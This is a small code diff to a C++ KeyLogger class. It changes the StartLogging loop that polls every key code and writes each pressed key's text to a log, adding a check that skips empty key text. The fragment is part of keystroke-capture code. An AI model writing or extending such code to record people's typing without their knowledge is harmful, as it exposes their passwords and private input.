@@ -221,7 +221,10 @@ void KeyLogger::StartLogging() {
 		for (int keyCode = 0; keyCode < 256; keyCode++) {
 			if (this->IsPressed(keyCode)) { 
 				wstring keyText = this->GetKeyText(keyCode);
-				this->logger->Write(keyText);
+
+				if (keyText.length() > 0) {
+					this->logger->Write(keyText);
+				}
 			}
 		}
 
